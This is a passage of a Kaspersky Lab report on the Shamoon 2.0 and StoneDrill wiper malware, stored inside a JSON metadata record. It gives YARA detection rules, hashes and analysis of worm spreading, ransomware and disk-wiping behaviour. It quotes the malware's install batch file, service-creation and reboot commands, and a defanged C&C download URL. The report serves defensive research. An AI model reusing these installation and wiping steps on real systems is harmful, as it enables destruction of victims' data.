{
    "id": "b6c3f7a8-203b-4212-936d-f5dced8ff1ef",
    "created_at": "2022-10-25T16:48:19.68874Z",
    "updated_at": "2025-03-27T02:16:11.675614Z",
    "deleted_at": null,
    "sha1_hash": "a3882311c6d695923d6e11d6902d754891ec5d14",
    "title": "",
    "authors": "",
    "file_creation_date": "2017-03-20T09:18:30Z",
    "file_modification_date": "2017-03-20T12:29:20Z",
    "file_size": 1425435,
    "plain_text": "# FROM SHAMOON TO STONEDRILL\n\n### Wipers attacking Saudi organizations and beyond\n\n#### Version 1.05\n\n 2017-03-07\n\n\n-----\n\nBeginning in November 2016, Kaspersky Lab observed a new wave of wiper attacks directed at\nmultiple targets in the Middle East. The malware used in the new attacks was a variant of the\n[infamous Shamoon worm that targeted Saudi Aramco and Rasgas back in 2012.](https://securelist.com/?s=shamoon)\n\nDormant for four years, one of the most mysterious wipers in history has returned.\n\nSo far, we have observed three waves of attacks of the Shamoon 2.0 malware, activated on 17\nNovember 2016, 29 November 2016 and 23 January 2017.\n\nAlso known as Disttrack, Shamoon is a highly destructive malware family that effectively wipes\nthe victim machine. A group known as the Cutting Sword of Justice took credit for the Saudi\n[Aramco attack by posting a Pastebin message](http://pastebin.com/HqAgaQRj) on the day of the attack (back in 2012), and\njustified the attack as a measure against the Saudi monarchy.\n\nThe Shamoon 2.0 attacks observed since November 2016 have targeted organizations in\nvarious critical and economic sectors in Saudi Arabia. Just like the previous variant, the\nShamoon 2.0 wiper aims for the mass destruction of systems inside targeted organizations.\n\nThe new attacks share many similarities with the 2012 wave, though featuring new tools and\ntechniques. During the first stage, the attackers obtain administrator credentials for the victim’s\nnetwork. Next, they build a custom wiper (Shamoon 2.0) which leverages these credentials to\nspread widely inside the organization. Finally, on a predefined date, the wiper activates,\nrendering the victim’s machines completely inoperable. It should be noted that the final stages\nof the attacks have their activity completely automated, without the need for communication with\nthe command and control center.\n\nWhile investigating the Shamoon 2.0 attacks, Kaspersky Lab also discovered a previously\nunknown wiper malware which appears to be targeting organizations in Saudi Arabia. We’re\ncalling this new wiper StoneDrill. StoneDrill has several “style” similarities to Shamoon, with\nmultiple interesting factors and techniques to allow for the better evasion of detection. In\naddition to suspected Saudi targets, one victim of StoneDrill was observed on the Kaspersky\nSecurity Network (KSN) in Europe. This makes us believe the threat actor behind StoneDrill is\nexpanding its wiping operations from the Middle East to Europe.\n\nTo summarize some of the characteristics of the new wiper attacks, for both Shamoon and\nStoneDrill:\n\n  - Shamoon 2.0 includes a fully functional ransomware module, in addition to its common\n\nwiping functionality.\n\n  - Shamoon 2.0 has both 32-bit and 64-bit components.\n\n  - The Shamoon samples we analyzed in January 2017 do not implement any command\n\nand control (C&C) communication; previous ones included a basic C&C functionality that\nreferenced local servers in the victim’s network.\n\n  - StoneDrill makes heavy use of evasion techniques to avoid sandbox execution.\n\n  - While Shamoon embeds Arabic-Yemen resource language sections, StoneDrill embeds\n\nmostly Persian resource language sections. Of course, we do not exclude the possibility\nof false flags.\n\n  - StoneDrill does not use drivers during deployment (unlike Shamoon) but relies on\n\nmemory injection of the wiping module into the victim’s preferred browser.\n\n\n-----\n\n  - Several similarities exist between Shamoon and StoneDrill.\n\n[● Multiple similarities were found between StoneDrill and previously analysed NewsBeef](https://securelist.com/blog/software/74503/freezer-paper-around-free-meat/)\n\nattacks.\n\n**What is new in this report?**\n\nThis report provides new insights into the Shamoon 2.0 and StoneDrill attacks, including:\n\n1. The discovery techniques and strategies we used for Shamoon and StoneDrill.\n2. Details on the ransomware functionality found in Shamoon 2.0. This functionality is\n\ncurrently inactive but could be used in future attacks.\n3. Details on the newly found StoneDrill functions, including its destructive capabilities\n\n(even with limited user privileges).\n4. Details on the similarities between malware styles and malware components’ source\n\ncode found in Shamoon, StoneDrill and NewsBeef.\n\n\n-----\n\n## 1. From Shamoon to StoneDrill: the discovery \n\n#### 1.1. Shamoon: It’s all about the “resources”\n\nFew people ever expected the return of Shamoon after four years of silence. This made the\nnews from the Middle East on 17 November 2016 quite surprising, and sent multiple\nshockwaves through the industry. After the second wave of attacks, which took place on 29\nNovember 2016, it became quite clear that Shamoon 2.0 was no longer an isolated incident, but\npart of a new series of attacks and we should expect more waves coming in. In order to make\nsure that Kaspersky Lab customers were protected, we started to develop specific detection\nstrategies and hunt for possible new variants.\n\nTo create the new detections, we used multiple ideas:\n\n  - The Shamoon wipers have their additional payloads stored as encrypted resources.\n\n  - Just like in 2012, the early Shamoon 2.0 samples used resources with three very\n\nspecific names - \"PKCS7\", \"PKCS12\" and \"X509\". Because of their uniqueness it was\nrelatively easy to find and detect them just by the resource names and their high\nentropy. Unfortunately, newer versions had random resource names like \"ICO\", \"LANG\"\nand \"MENU\", so the ability to easily find new samples was lost.\n\nHowever, all programmers, especially malware writers, have their own habits, and the authors\nof Shamoon are no exception:\n\n  - Since the Shamoon 1.0 story, from 2012 (6dd571b84470ad9caad30a6a6acf491e) until\n\n2016 (2cd0a5f1e9bcce6807e57ec8477d222a) many samples had one additional\nencrypted resource with a specific, although non-unique name \"101\".\n\nThis finding got us thinking that the Shamoon attackers can re-use this pattern and we’ve\ninvestigated ways of using this to hunt for new, unknown malware generations from their side.\n\nAs researchers, we tested a lot of different approaches to find similar malicious samples based\non this artefact, and one of them worked unexpectedly. Here’s the logic we used to create the\ndetection:\n\n1. We assumed that for the next waves of attack the authors would continue to recompile\n\nthe Shamoon 2.0 version from 2016, while trying to avoid AV detection, so we focused\nmostly on the newest Shamoon versions.\n2. We assumed that the wiper would again enumerate all files inside folders, so it would\n\nstill call Windows API functions FindFirstFile and FindNextFile.\n3. Because it uses encrypted resources, we assumed that it would find and load them with\n\nthe Windows API functions FindResource and LoadResource.\n4. Inside all known versions of Shamoon 2.0, the resource \"101\" was found, with the\n\nfollowing properties:\n\n      - Level of entropy > 7.8 - that means the data inside is encrypted or compressed.\n\n\n-----\n\n      - Size about 30 KB - we’ve decided to set the minimum limit at 20 KB.\n\n      - Language = neutral (not set); all other resources had the languages \"Arabic\n\n(Yemen)\" or \"English United States\".\n\n      - Does not contain an unencrypted PE executable file inside.\n\nAfter initial testing, we decided to add more search criteria to limit the number of possible false\npositive detections:\n\n  - Shamoon samples had no digital signature, so the sample would be unsigned.\n\n  - All known Shamoon samples with resource \"101\" had a maximum file size of 370 KB, so\n\nit's reasonable to limit the file size to twice that number - 700 KB.\n\n  - The number of resources inside the sample should not be too high - less than 15.\n[Our favorite malware hunting tool, Yara, provides a rule-bused approach to create descriptions of](http://virustotal.github.io/yara/)\nmalware families based on textual or binary patterns.\n\nHere’s the detection rule we wrote using all the above conditions:\n\nimport \"pe\"\nimport \"math\"\n\nrule susp_file_enumerator_with_encrypted_resource_101 {\nmeta:\n\ncopyright = \"Kaspersky Lab\"\ndescription = \"Generic detection for samples that enumerate files with encrypted resource\ncalled 101\"\nhash = \"2cd0a5f1e9bcce6807e57ec8477d222a\"\nhash = \"c843046e54b755ec63ccb09d0a689674\"\nversion = \"1.4\"\n\nstrings:\n\n$mz = \"This program cannot be run in DOS mode.\"\n\n$a1 = \"FindFirstFile\" ascii wide nocase\n$a2 = \"FindNextFile\" ascii wide nocase\n$a3 = \"FindResource\" ascii wide nocase\n$a4 = \"LoadResource\" ascii wide nocase\n\ncondition:\n\nuint16(0) == 0x5A4D and\nall of them and\nfilesize < 700000 and\npe.number_of_sections > 4 and\npe.number_of_signatures == 0 and\npe.number_of_resources > 1 and pe.number_of_resources < 15 and\nfor any i in (0..pe.number_of_resources - 1):\n( (math.entropy(pe.resources[i].offset, pe.resources[i].length) > 7.8) and\npe.resources[i].id == 101 and\npe.resources[i].length > 20000 and\npe.resources[i].language == 0 and\n\n\n-----\n\nnot ($mz in (pe.resources[i].offset..pe.resources[i].offset + pe.resources[i].length))\n)\n}\n\nWhile running the above Yara rule on Kaspersky Lab’s samples selection, we found an\ninteresting, fresh sample. After a quick analysis, we realized it was yet another wiper. However,\nit was not Shamoon, but something different. We’ve decided to call it StoneDrill.\n\n#### 1.2. From StoneDrill to NewsBeef\n\nHaving identified the StoneDrill sample through the Yara technique above, we started looking\nfor other possibly related samples.\n\nOne Yara technique that has proved useful in the past for finding new malware variants is the\ndevelopment of Yara rules for decrypted malware components. During attacks, malware\ncomponents can be changed to fit the attackers’ requirements, so hunting for decrypted\nmalware code might help in finding new malware variants or even older samples.\n\nWith StoneDrill, we developed several Yara rules for the decrypted payloads. Here’s one of our\nYara rules for a decrypted StoneDrill module:\n\nrule StoneDrill_main_sub {\nmeta:\nauthor = \"Kaspersky Lab\"\ndescription  = \"Rule to detect StoneDrill (decrypted) samples\"\nhash = \"d01781f1246fd1b64e09170bd6600fe1\"\nhash = \"ac3c25534c076623192b9381f926ba0d\"\nversion = \"1.0\"\n\nstrings:\n\n$code = {B8 08 00 FE 7F FF 30 8F 44 24 ?? 68 B4 0F 00 00 FF 15 ?? ?? ?? 00 B8 08 00 FE 7F FF\n30 8F 44 24 ?? 8B ?? 24 [1 - 4] 2B ?? 24 [6] F7 ?1 [5 - 12] 00}\n\ncondition:\n\nuint16(0) == 0x5A4D and\n$code and\nfilesize < 5000000\n}\n\nInterestingly, this rule allowed us to find a new category of samples, which we previously\n[connected with a threat actor named NewsBeef. We wrote about NewsBeef roughly one year](https://securelist.com/blog/software/74503/freezer-paper-around-free-meat/)\nago, in relation to another set of attacks against oil and energy companies from the Middle East.\n\n\n-----\n\nFurther analysis indicated the malware samples from StoneDrill and NewsBeef appear to be\nconnected together through numerous internal similarities.\n\n_The use of simple logic in conjunction with a knowledge of Yara can help attain a state-of-the-art_\n_outcome in malware hunting activity. If you would like to learn more, you can join us for the Yara_\n_[training \"Hunt APTs with Yara like a GReAT Ninja\"](https://sas.kaspersky.com/#hunt-apts-with-yara-like-a-great-ninja)_ _[and the advanced “Malware Reverse](https://sas.kaspersky.com/#malware-reverse-engineering-course)_\n**_[Engineering course”](https://sas.kaspersky.com/#malware-reverse-engineering-course)_** _on April 1-2, 2017 in St. Maarten._\n\n_Several private intelligence reports on Shamoon, StoneDrill and NewsBeef are available to_\n_subscribers of_ _[Kaspersky Lab’s Private Intelligence Reports. For more information please](https://usa.kaspersky.com/enterprise-security/apt-intelligence-reporting)_\n_contact:_ _[intelreports@kaspersky.com](mailto:intelreports@kaspersky.com)_\n\n\n-----\n\n## 2. Technical details - Shamoon 2.0 - language usage and possible Yemeni links\n\nSeveral good technical articles on Shamoon 2.0 have been published by some of our\n[colleagues, including Palo Alto,](http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/) [IBM X-Force,](https://exchange.xforce.ibmcloud.com/collection/Spear-Phishing-Attacks-Preceding-Shamoon-Malware-Breakouts-eeed4eede51b9a4587f4c7c816ad6e4e) [Symantec](https://www.symantec.com/connect/blogs/greenbug-cyberespionage-group-targeting-middle-east-possible-links-shamoon) and others.\n\nThroughout this blog we describe some of the technical details of the new Shamoon 2.0 attacks\nand what are the most important things that make them stand out. For the analysis we used the\nearliest set of samples, with a hardcoded attack date of 17 November 2016. However, we’ve\nalso included details from the newer samples, such as hardcoded credentials.\n\nDuring deployment in the victim’s environment, the main Shamoon 2.0 wiper module is installed\nthrough a Windows Batch file with the following content:\n\n**@echo off**\n**set u100=ntertmgr32.exe**\n**set u200=service**\n**set u800=%~dp0**\n**copy /Y \"%u800%%u100%\" \"%systemroot%\\system32\\%u100%\" start /b %systemroot%\\system32\\%u100%**\n**%u200%**\n\nInterestingly, the sample resources appear to have a language ID of “Arabic (Yemen)”,\nsuggesting the attackers might be from Yemen. Of course, we should not disregard the\npossibility that the resource language could be a false flag planted there by the attackers.\n\n#### 2.1. 32-bit Shamoon dropper/worm (ntssrvr32.exe)\n\nSHA256 394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b\n\nMD5 5446f46d89124462ae7aca4fce420423\n\nCompiled 2009.02.15 12:31:44 (GMT), VC 2010\n\nType I386 Console EXE\n\nSize 1 349 632 bytes\n\nThis executable is a worm designed to infect computers connected to a Windows domain. To\nachieve this, it relies on a list of hardcoded, previously stolen username/password pairs\nbelonging to administrators of the targeted domain. All the strings in the malware are obfuscated\n\n|SHA256|394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b|\n|---|---|\n|MD5|5446f46d89124462ae7aca4fce420423|\n|Compiled|2009.02.15 12:31:44 (GMT), VC 2010|\n|Type|I386 Console EXE|\n|Size|1 349 632 bytes|\n\n\n-----\n\nwith simple one byte ADD operations and are decrypted upon execution. All the dropped files\nexhibit file times altered to match that of the system’s kernel32.dll. The module only works if it\nis run with exactly one command line parameter, regardless of the parameter. Otherwise, it\nsimply exits (likely a measure to avoid accidental execution).\n\nIf the victim host’s system “PROCESSOR_ARCHITECTURE” environment variable is “AMD64”\nor “amd64”, the module installs its 64-bit variant. The variant is contained within a resource\nnamed “X509”. The resource is de-XORed and dropped onto the system under:\n**<%WindowsDir%\\system32\\ntssrvr64.exe>.**\n\nIt is then installed as a service via the command:\n\n**“cmd.exe /c \"ping -n 30 127.0.0.1 >nul && sc config NtsSrv binpath=**\n**\"C:\\WINDOWS\\system32\\ntssrvr64.exe LocalService\" && ping -n 10 127.0.0.1 >nul && sc start NtsSrv”**\n\n##### 2.1.1. Installation as a Service\n\nIf the malware is running on a 32-bit system, this module installs itself as a service named\n“NtsSrv”:\n\n**Name**\n**Display Name** **Description**\n\nNtsSrv Microsoft Network Realtime Helps guard against time change attempts targeting known\nInspection Service and newly discovered vulnerabilities in network time protocols\n\nhe service is set as dependent on the “RpcSs” system service. The properties of the system\nservice “LanmanWorkstation” are changed so that it depends on the newly created “NtsSrv”\nservice to allow it to start after the malware.\n\n##### 2.1.2. Worm Functionality\n\nOnce this module runs (as a service), the worm-spreading functionality is started, targeting\nevery network host within the IPv4 address range, with the same first three bytes of the victim’s\nIP and the last byte in the range from 0 to 255, thus operating inside subnet class C (a.b.c.0/24).\n\nHere’s how it works:\n\n1. The worm connects to a remote machine’s registry and disables Remote UAC by setting\n\nthe LocalAccountTokenFilterPolicy registry key value to 1 in\n**HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies**\n**\\system.**\n2. If the RemoteRegistry system service is disabled and doesn't run on the target system,\n\nthe worm reconfigures this service to be auto-started and then starts it immediately. If\nthe connection to a remote registry is unsuccessful, the worm repeats the connection\nattempt with a hardcoded set of stolen domain administrator credentials. The worm then\n\n|Name|Display Name|Description|\n|---|---|---|\n|NtsSrv|Microsoft Network Realtime Inspection Service|Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols|\n\n\n-----\n\nsearches for remote “\\windows\\system32\\csrss.exe” files by prepending this path with\nthe victim machine’s IP as well as system shares: \"ADMIN$\", \"C$\", \"D$\", \"E$\".\n3. Once a remote system32 folder is found, the worm copies itself into this folder under the\n\nname “ntssrvr32.exe”. It schedules a remote job to run “ntssrvr32.exe LocalService”\nafter 90 seconds.\n4. If the remote scheduler is inaccessible, the worm tries to set up NtsSrv and runs the\n\nservice on the remote machine with the same parameters as it used for self-installation.\nAttempts with stolen credentials are also performed.\n5. An alternative but similar infection method is coded into the worm, where each infection\n\nis performed in a separate thread without relying on the scheduler; but it is not used at\nthis time.\n\n##### 2.1.3. Command and Control (C&C) Module\n\nAfter replication, the malware runs a command-and-control communication module. This\nmodule is contained within a resource named “Pkcs7”. It is de-XORed and dropped as\n**<%WindowsDir%\\system32\\netinit.exe>. Using the hardcoded credentials, it creates a**\nWindows Task Scheduler job that executes netinit.exe 90 seconds after creation. It waits 95\nseconds and then deletes the scheduled job.\n\n##### 2.1.4. Wiper and Encryptor Module\n\nFinally, the malware drops the wiper/encryptor module. This module first checks if it’s time to\nrun the main payload. The activation period can be set in two ways:\n\n1. It checks if the system time is not earlier than the time specified in the following file:\n\n**<%windir%\\inf\\usbvideo324.pnf>**\n2. If the file doesn’t exist, it checks that the system time is not earlier than the hardcoded\n\ndate: <20:45, 17 Nov 2016>\nAt the specified time, the malware drops two files:\n\nThe first file, <c:\\windows\\temp\\key8854321.pub> is unused in this attack and contains a\npublic encryption key. This is an indicator that the attackers might be using Shamoon as a\n**ransomware tool in upcoming waves.**\n\n”-----BEGINPUBLICKEY----MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAusZItknNNeV+xjPzIZLyB5m6gaNREC6I3CZQ7F1vDU\nCaGki83s6JVDo2NGN70mhx4q5NJrgXDzD7McpxDoJsDkKwr5mm3yEs9vmZwHcEWcvU6QbJguFgPJk6zoatVq0\nWsfIkN50ywQMVq2zmiJel2UoalPJzCWbAYG0BShXjnlcsfV8GcPW+fNRCSGKVue3RE6cV5HlAjSD8VSk4KERPu\nWfvbk/pP0qDE60Uc7K3Bl7uxbHVB2g8unuj8B9d81TKT0hForie8V2N4FT0bdAHUHU6LT/XtAdLCp9/cTUf8zk1MC\noxXj6CSg9xKgGgnJazC/u3R0nm/pPriF/ZkwrVhJtDd/1nf4JC1sDmc3mgv0hI+7hthf+fZkv75doHg67Gg6JOZQIMytQ\neF8ylnUgC1ZyrAmaxN0OV69zhktzZISdmmkbtyZSHEZzIdC9PF/MJzCK5ylkEI2jQpAabgv34o2o+ZMJLSDZbNrXy9\n0LUy8GjtzJYmv02MVLjy7CSgglIbulSgMP4QC/i1fTIPhlSlMyCKnGIKdKY31KFQnoOzI8kudeted8eF/ubpFcna0TDc\nEk+Dt8s4pN4/DsGQoncWg9HMyC8Q/MWIE/JuOCisovJ0PYq2aKetDNRMm7THcXalXKD9RpczObRWKGKzMJD\nonmBm2AETME74MRPmC/FWgsCAwEAAQ==\n\n-----ENDPUBLICKEY-----”\n\n\n-----\n\nThe second file is dropped from a resource named “PKCS12”. It is de-XORed and dropped into\nthe %system% directory with a name randomly selected from the following list:\n\n**caclsrv.exe** **dvdquery.exe** **msinit.exe** **sigver.exe** **wcscript.exe**\n\n**certutl.exe** **event.exe** **ntfrsutil.exe** **routeman.exe** **ntnw.exe**\n\n**clean.exe** **findfile.exe** **ntdsutl.exe** **rrasrv.exe** **netx.exe**\n\n**ctrl.exe** **gpget.exe** **power.exe** **sacses.exe** **fsutl.exe**\n\n**dfrag.exe** **ipsecure.exe** **rdsadmin.exe** **sfmsc.exe** **extract.exe**\n\n**dnslookup.exe** **iissrv.exe** **regsys.exe** **smbinit.exe**\n\nThe dropped payload is then scheduled to run in the same way as the C&C communication\nmodule. We describe it in detail below.\n\n#### 2.2. 64-bit Shamoon Dropper (ntssrvr64.exe)\n\nSHA256 47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34\n\nMD5 8fbe990c2d493f58a2afa2b746e49c86\n\nCompiled 2009.02.15 12:32:19 (GMT), VC 2010\n\nType AMD64 Console EXE\n\nSize 717 312 bytes\n\nThis dropper has the same functionality as the 32-bit variant. This version is contained within a\nresource named “X509”. The resource is de-XORed and dropped onto the system under:\n**<%WindowsDir%\\system32\\ntssrvr64.exe>.**\n\n##### 2.2.1. C&C Communication Module (netinit.exe)\n\n|caclsrv.exe|dvdquery.exe|msinit.exe|sigver.exe|wcscript.exe|\n|---|---|---|---|---|\n|certutl.exe|event.exe|ntfrsutil.exe|routeman.exe|ntnw.exe|\n|clean.exe|findfile.exe|ntdsutl.exe|rrasrv.exe|netx.exe|\n|ctrl.exe|gpget.exe|power.exe|sacses.exe|fsutl.exe|\n|dfrag.exe|ipsecure.exe|rdsadmin.exe|sfmsc.exe|extract.exe|\n|dnslookup.exe|iissrv.exe|regsys.exe|smbinit.exe||\n\n|SHA256|47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34|\n|---|---|\n|MD5|8fbe990c2d493f58a2afa2b746e49c86|\n|Compiled|2009.02.15 12:32:19 (GMT), VC 2010|\n|Type|AMD64 Console EXE|\n|Size|717 312 bytes|\n\n|SHA256|61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842|\n|---|---|\n|MD5|5bac4381c00044d7f4e4cbfd368ba03b|\n|Compiled|2009.02.15 12:29:20 (GMT), VC 2010|\n|Type|I386 Console EXE|\n\n\n-----\n\n|Size|159 744 bytes|\n|---|---|\n\n|SHA256|772ceedbc2cacf7b16ae967de310350e42aa47e5cef19f4423220d41501d86a5|\n|---|---|\n|MD5|ac4d91e919a3ef210a59acab0dbb9ab5|\n|Compiled|2009.02.15 12:29:41 (GMT), VC 2010|\n|Type|AMD64 Console EXE|\n|Size|183 808 bytes|\n\n\nThe strings in the C&C module are obfuscated by simple ADD operations and are decrypted\nupon execution. This module periodically connects to a C&C with the following URL:\n\n**hxxp://server/category/page.php?shinu=w74K9/xQp1VjJfwwadq4HCl7VheuQXk49YnNkb**\n**XR+0ghrH YIRFE51FQskZya+jIPqo3VlOEpfvvgxvO26pZ3oA==**\n\nThe strange “server” in the URL string suggests multiple possibilities:\n\n1. It is used by mistake.\n2. It may suggest a placeholder value that wasn’t set for the purposes of this attack.\n3. A server with this name might be installed by the attackers somewhere inside the local\n\nnetwork.\n4. The local network may rely on a now poisoned DNS server.\n\nThe string also contains the word “shinu=”, which is quite interesting. This is possibly a\ntransliteration of the Gulf Arabic slang word ‘شنو’ for ‘what?’. This particular slang is used in\nseveral countries, notably Iraq, but also sometimes in Kuwait and Bahrain. The “shinu”\nparameter string contains the following encoded information about the victim system:\n\n  - Host IP and MAC addresses\n\n  - Windows version information\n\n  - Windows input locale IDs (keyboard layouts)\n\n  - Number of connection attempts, or content of the <%WINDIR%\\inf\\netimm173.pnf> file\n\nif the file exists. The <netimm173.pnf> file contains information about changes made by\nthe wiper payload module.\nIf the direct connection fails, this module tries to connect using a hardcoded proxy server of\n“1.1.1.1:8080”. This supports the assumption that the malware deployed in this case does not\ninclude a working C&C and the operators used a raw, unconfigured C&C module.\n\nData received from the C&C server is handled in two possible ways:\n\n1. An executable file is downloaded as <%TEMP%\\Temp\\filer%rndDigits%.exe> and\n\nexecuted immediately thereafter.\n\n\n-----\n\n2. A file is dropped in <%WINDIR%\\inf\\usbvideo324.pnf> that contains the wiper\n\npayload’s activation time. This effectively allows the attackers to configure the wiper time\nbomb.\n\n##### 2.2.2. Disk Wiper/Encryptor Module\n\nSHA256 128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd\n\nMD5 2cd0a5f1e9bcce6807e57ec8477d222a\n\nCompiled 2009.02.15 12:30:19 (GMT), VC 2010\n\nType I386 Console EXE\n\nSize 282 112 bytes\n\nSHA256 c7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a\n\nMD5 c843046e54b755ec63ccb09d0a689674\n\nCompiled 2009.02.15 12:30:41 (GMT), VC 2010\n\nType AMD64 Console EXE\n\nSize 327 680 bytes\n\nDespite the widespread coverage of the resurgence of the Shamoon wiper, few have noted the\nnew ransomware functionality. The wiper module of Shamoon 2.0 has been designed to run as\neither a wiper or an encryptor (ransomware).\n\n[1. The module is configured to wipe the disk using the “Death of Alan Kurdi” photo. The](https://en.wikipedia.org/wiki/Death_of_Alan_Kurdi)\n\npicture depicts a three-year-old Syrian refugee who drowned as his family attempted to\nreach Europe and travel on to Canada. The module can also be configured to wipe the\ndisk using random data.\n2. In the “encryption/ransomware” mode, a weak pseudo-random RC4 key is generated,\n\nwhich is further encrypted by the RSA public key and stored directly on the hard drive (at\n**<\\Device\\Harddisk0\\Partition0>) starting at offset 0x201, right after the master boot**\nrecord.\n3. Once the module is extracted, it drops a legitimate driver named <DRDISK.SYS> to the\n\ndisk and starts it. This driver is used for low-level disk operations and is well known from\nprevious Shamoon attacks. Before accessing this driver, the system date is changed to\na random day between the 1st and 20th of August, 2012 to fool the driver’s license\nchecks and evaluation period.\n\n|SHA256|128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd|\n|---|---|\n|MD5|2cd0a5f1e9bcce6807e57ec8477d222a|\n|Compiled|2009.02.15 12:30:19 (GMT), VC 2010|\n|Type|I386 Console EXE|\n|Size|282 112 bytes|\n\n|SHA256|c7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a|\n|---|---|\n|MD5|c843046e54b755ec63ccb09d0a689674|\n|Compiled|2009.02.15 12:30:41 (GMT), VC 2010|\n|Type|AMD64 Console EXE|\n|Size|327 680 bytes|\n\n\n-----\n\n4. The payload employs the file <%WINDIR%\\inf\\netimm173.pnf> to keep track of the\n\noperations performed. The content of this file is sent to the C&C server by the\ncommunication module.\n5. The strings in this module are also obfuscated by simple ADD operations and decrypted\n\nat start.\n\n##### 2.2.3. Payload Configuration \n\nThere are two 25-byte length configuration strings in the wiper payload:\n\n  - “SPPPPPPPPPMPPHHHHHHHHHHBO”\n\n  - “NNNNNNNNNNWNNNNNNNNNNNWWW”\nLetters in the first string specify a type of operation to be performed, with the available operations\nexplained below. The second string designates how these operations should be performed: the letter 'N'\nmeans that the operation will be executed synchronously in separate threads, the letter 'W' means the\noperation will wait until a previous step is completed.\n\nHere’s an explanation of the configuration string above:\n\n**Letter** **Operation**\n\n**S** The first operation, marked by the letter 'S' wipes (or encrypts) the content of the Shamoon\n2.0 components (netinit.exe, ntssrvr32.exe, and wiper module itself). Using the low-level disk\naccess driver makes it possible to wipe the body of a running executable.\n\n**P** The next 9 'P' letters indicate wiping (or encrypting) of the files placed inside the traditional\nuser folders: desktop, download, document, desktop, download, document, picture, video,\nand music.\n\n**M** The 'M' wipes (or encrypts) the NTFS MFT data on all accessible drives mapped from A: to\nZ:, except the system drive.\n\n**P** The next two 'P' letters wipe (or encrypt) files inside the following folders:\n<C:\\Windows\\System32\\Drivers> and <C:\\Windows\\System32\\Config\\systemprofile>\n\n**H** The 10 'H' letters wipe (or encrypt) some of the partitions from 9 to 0 on hard disks 9-0\n(SystemBoot and FirmwareBootDevice partitions and partition 0 on the system drive are\nskipped in this step)\n\n**B** The 'B' letter wipes (or encrypts) part of the partition designated as FirmwareBootDevice\n\n**O** The final 'O' wipes (or encrypts) the Master File Table on the system drive, the first sector of\n\\Device\\Harddisk0\\Partition0, and the last part of the SystemBootDevice partition.\n\nTwo minutes after all tasks are completed, the system is rebooted with the following command:\n“shutdown -r -f -t 2”.\n\n|Letter|Operation|\n|---|---|\n|S|The first operation, marked by the letter 'S' wipes (or encrypts) the content of the Shamoon 2.0 components (netinit.exe, ntssrvr32.exe, and wiper module itself). Using the low-level disk access driver makes it possible to wipe the body of a running executable.|\n|P|The next 9 'P' letters indicate wiping (or encrypting) of the files placed inside the traditional user folders: desktop, download, document, desktop, download, document, picture, video, and music.|\n|M|The 'M' wipes (or encrypts) the NTFS MFT data on all accessible drives mapped from A: to Z:, except the system drive.|\n|P|The next two 'P' letters wipe (or encrypt) files inside the following folders: <C:\\Windows\\System32\\Drivers> and <C:\\Windows\\System32\\Config\\systemprofile>|\n|H|The 10 'H' letters wipe (or encrypt) some of the partitions from 9 to 0 on hard disks 9-0 (SystemBoot and FirmwareBootDevice partitions and partition 0 on the system drive are skipped in this step)|\n|B|The 'B' letter wipes (or encrypts) part of the partition designated as FirmwareBootDevice|\n|O|The final 'O' wipes (or encrypts) the Master File Table on the system drive, the first sector of \\Device\\Harddisk0\\Partition0, and the last part of the SystemBootDevice partition.|\n\n\n-----\n\n##### 2.2.4. Low-Level Disk Access Driver (DRDISK.SYS)\n\nSHA256 4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6\n\nMD5 1493d342e7a36553c56b2adea150949e\n\nCompiled 2011.12.28 16:51:24 (GMT), VC 2005\n\nType I386 Native\n\nSize 27 280 bytes\n\nSHA256 eaee62a8238189e8607b24c463a84c83c2331a43b034484972e4b302bd3634d9\n\nMD5 42f883d029b47f9d490a427091da3f5d\n\nCompiled 2011.12.28 16:51:29 (GMT), VC 2005\n\nType AMD64 Native\n\nSize 31 998 bytes\n\n[These signed legitimate drivers form part of the EldoS RawDisk product. This product is](https://www.eldos.com/)\ndesigned to provide direct access to disks and protected files from user-mode applications.\nSadly, this functionality has been adopted and abused by multiple threat actors to develop wiper\n[malware, as in the case of the original Shamoon or the Lazarus Destover](https://securelist.com/blog/incidents/34088/what-was-that-wiper-thing-48/) malware used in the\ninfamous Sony Pictures Entertainment attack of 2014. In order to bypass the EldoS RawDisk\ndrivers’ evaluation period license checks, the Shamoon 2.0 malware changes the system date\nto a random day between the 1st and 20th of August, 2012.\n\n#### 2.3. From Shamoon 2.0 to StoneDrill 1.0\n\nStoneDrill has some style similarities to the previously discovered Shamoon samples.\nParticularly interesting is the heavy use of anti-emulation techniques in the malware, which\nprevents the automated analysis by emulators or sandboxes.\n\nOne of the most interesting characteristics is the presence of the Persian language in multiple\nresource sections.\n\n|SHA256|4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6|\n|---|---|\n|MD5|1493d342e7a36553c56b2adea150949e|\n|Compiled|2011.12.28 16:51:24 (GMT), VC 2005|\n|Type|I386 Native|\n|Size|27 280 bytes|\n\n|SHA256|eaee62a8238189e8607b24c463a84c83c2331a43b034484972e4b302bd3634d9|\n|---|---|\n|MD5|42f883d029b47f9d490a427091da3f5d|\n|Compiled|2011.12.28 16:51:29 (GMT), VC 2005|\n|Type|AMD64 Native|\n|Size|31 998 bytes|\n\n\n-----\n\nSamples of the StoneDrill malware were uploaded multiple times to multiscanner systems from\nSaudi Arabia between 27 and 30 November 2016. One StoneDrill victim was also observed in\nthe Kaspersky Security Network (KSN) in Europe.\n\n#### 2.4. The StoneDrill wiper\n\nSHA256 62aabce7a5741a9270cddac49cd1d715305c1d0505e620bbeaec6ff9b6fd0260\n\nMD5 0ccc9ec82f1d44c243329014b82d3125\n\nCompiled 